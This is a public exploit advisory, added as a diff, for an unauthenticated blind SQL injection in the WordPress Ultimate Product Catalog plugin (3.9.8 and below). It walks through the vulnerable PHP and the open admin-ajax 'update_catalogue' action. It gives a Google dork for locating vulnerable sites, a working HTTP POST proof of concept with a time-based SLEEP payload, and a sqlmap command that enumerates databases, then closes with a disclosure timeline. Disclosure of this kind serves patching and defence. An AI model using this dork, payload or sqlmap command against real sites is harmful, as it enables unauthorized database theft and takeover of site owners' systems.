@@ -1,0 +1,100 @@
+# Exploit Title: Wordpress Ultimate-Product-Catalog <= 3.9.8 (do_shortcode via ajax) Unsanitized shortcode attributes - Unauthenticated Blind SQL Injection
+# Date: 2016-07-28
+# Google Dork: "Index of /wp-content/plugins/ultimate-product-catalogue/"
+# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
+# Vendor Homepage: http://www.EtoileWebDesign.com/
+# plugin uri: http://www.EtoileWebDesign.com/ultimate-product-catalogue/
+# Software Link: 
+# Version: <=3.9.8
+# Tested on: windows 7 + firefox. 
+
+====================
+ DESCRIPTION
+====================
+
+A vulnerability has been discvered in the wordpress Ultimate Product Catalog by affecting v3.9.8 and below (tested).
+Due to a unsanitized parameters passed to the shorcode function `Insert_Product_Catalog`  [ "product-catalogue" ]
+located in `/Funtions/Shortcodes.php` line 4:
+
+function Insert_Product_Catalog($atts) {	
+	// Select the catalogue information from the database
+	...
+
+	$Catalogue = $wpdb->get_row("SELECT * FROM $catalogues_table_name WHERE Catalogue_ID=" . $id);
+	$CatalogueItems = $wpdb->get_results("SELECT * FROM $catalogue_items_table_name WHERE Catalogue_ID=" . $id . " ORDER BY Position");
+	...
+	
+	return $ProductString;
+}
+
+The $id parameter is extracted with `extract` function from $atts. This is a vulnerability with which can be exploited by creating  shortcodes with 
+malicious attributes, exploitable only by administrators, editors, authors. But in file `/Functions/Process_Ajax.php`  line 113...
+
+function UPCP_Filter_Catalogue() {
+	$Path = ABSPATH . 'wp-load.php';
+	include_once($Path);
+	
+	$id = $_POST['id']; <-- we can control this value!!
+
+	...
+	
+	echo do_shortcode("[product-catalogue id='" . $id . "' only_inner='Yes' starting_layout='" . $start_layout . "' excluded_layouts='" . $exclude_layouts . "' current_page='" . $current_page . "' ajax_reload='" . $ajax_reload . "' ajax_url='" . $ajax_url . "' request_count='" . $request_count . "' category='" . $Category . "' subcategory='" . $SubCategory . "' tags='" . $Tags . "' custom_fields='" . $Custom_Fields . "' prod_name='" . $Prod_Name . "' min_price='" . $Min_Price . "' max_price='" . $Max_Price . "']");
+}
+
+
+This is interesting because that function calls `do_shortcode` executing the shortcode 'product-catalogue' as a result, this calls `Insert_Product_Catalog` wich 
+I found the SQLi, now we need to found a place where ` UPCP_Filter_Catalogue` is called and in line 138-139 i found...
+
+...
+add_action('wp_ajax_update_catalogue', 'UPCP_Filter_Catalogue');
+add_action( 'wp_ajax_nopriv_update_catalogue', 'UPCP_Filter_Catalogue');
+...
+
+this means that we can execute that function only with a request to `/wp-admin/admin-ajax.php?action=update_catalogue` and send the vulnerable $id parameter
+with our custom payload. Note that `wp_ajax_nopriv` prefix makes this vulnerability exploitable by unauthenticated users.
+
+Example:
+
+http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=update_catalogue
+
+POSTDATA: id=0+or+(our+custom+select+here)+--
+
+
+An attacker can exploit this vulnerability and compromise all user records or take over control of the host machine.
+
+==============
+ POC
+==============
+-----------------
+//REQUEST
+------------------
+
+POST /wordpress/wp-admin/admin-ajax.php?action=update_catalogue HTTP/1.1
+Host: localhost
+Content-Length: 21
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.8
+Cookie: 
+
+id=1+OR+SLEEP(10)+--+
+
+--------------------------
+ EXPLOITING WITH SQLMAP
+------------------------
+
+sqlmap --url="http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=update_catalogue" --data="id=1" --level=5 --risk=3 --technique=B  -p id --dbs --dbms=mysql
+
+(listing all available databases)
+
+
+==================================
+time-line
+===================================
+
+2016-07-28: reported to vendor.
+2016-07-28: vendor released plugin version 3.9.9. saying in changelog "Minor ajax update to switch to a prepared statement".
+2016-07-29: public disclousure.
+===================================
